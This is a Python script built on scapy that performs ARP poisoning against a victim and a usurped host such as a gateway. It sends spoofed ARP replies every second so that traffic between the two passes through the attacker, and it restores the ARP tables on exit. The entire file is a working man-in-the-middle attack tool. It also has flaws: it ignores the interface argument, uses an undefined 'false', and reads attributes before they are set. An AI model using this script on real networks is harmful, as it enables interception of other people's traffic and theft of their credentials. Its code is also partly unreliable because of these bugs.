#!/usr/bin/env python

from scapy.all import *
import threading
import sys

class ARPPoisoner(threading.Thread):
    def __init__(self, victimIp = '0.0.0.0', usurpedIp = '192.168.1.1', interface = 'eth0'):
        self.victimIp = victimIp
        self.usurpedIp = usurpedIp
        self.interface = 'eth0'
        threading.Thread.__init__(self)
        self.__stopped = threading.Event()

    def __getHwaddr(self, ip):
        resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=10, verbose=0)
        for sended, received in resp:
            if received[ARP].hwsrc:
                return received[ARP].hwsrc
        return false;

    def __restoreNetwork(self):
        send(ARP(op=2, pdst=self.usurpedIp, hwdst="ff:ff:ff:ff:ff:ff", psrc=self.victimIp, hwsrc=self.victimHwAddr), verbose=0)
        send(ARP(op=2, pdst=self.victimIp, hwdst="ff:ff:ff:ff:ff:ff", psrc=self.usurpedIp, hwsrc=self.usurpedHwAddr), verbose=0)
        print("Restoring Network")

    def getHwAddrVictim(self):
        self.victimHwAddr = self.__getHwaddr(self.victimIp)
        return (self.victimHwAddr)
        
    def getHwAddrUsurped(self):
        self.usurpedHwAddr = self.__getHwaddr(self.usurpedIp)
        return (self.usurpedHwAddr)

    def usurp(self):
        send(ARP(op=2, pdst=self.usurpedIp, hwdst=self.usurpedHwAddr, psrc=self.victimIp), verbose=0)
        send(ARP(op=2, pdst=self.victimIp, hwdst=self.victimHwAddr, psrc=self.usurpedIp), verbose=0)

    def run(self):
        if not self.victimHwAddr:
            self.victimHwAddr = self.getHwAddrVictim()
        if not self.usurpedHwAddr:
            self.usurpedHwAddr = self.getHwAddrUsurped()
        while not self.__stopped.isSet():
            self.usurp()
            self.__stopped.wait(1.0)

    def stop(self):
        self.__stopped.set()
        self.__restoreNetwork()

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('usage: ' + sys.argv[0] + ' VICTIM_IP USURPED_IP [interface]')
        print('eth0 is interface by default')
        exit(0);
    if len(sys.argv) == 4:
        poisoner = ARPPoisoner(sys.argv[1], sys.argv[2], sys.argv[3])
    else:
        poisoner = ARPPoisoner(sys.argv[1], sys.argv[2])
    hwaddr_victim = poisoner.getHwAddrVictim()
    hwaddr_usurped = poisoner.getHwAddrUsurped()
    if hwaddr_victim:
        print("Victim MAC Address: " + hwaddr_victim)
    if hwaddr_usurped:
        print("Usurped MAC Address: " + hwaddr_usurped)
    try:
        poisoner.run();
        threading.Event().wait()
    except KeyboardInterrupt:
        poisoner.stop();
        print("Leaving")
